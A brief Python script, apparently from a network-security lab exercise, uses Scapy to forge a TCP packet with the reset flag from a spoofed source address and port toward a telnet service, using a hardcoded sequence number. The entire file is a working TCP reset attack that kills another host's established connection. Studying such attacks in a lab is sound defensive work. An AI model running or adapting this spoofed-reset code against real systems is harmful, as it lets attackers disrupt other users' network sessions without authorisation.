#!/usr/bin/python3
from scapy.all import *

print("SENDING RESET PACKET.........")
ip  = IP(src="10.9.0.3", dst="10.9.0.2")
tcp = TCP(sport=41806, dport=23,flags="R",seq=3345820281)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
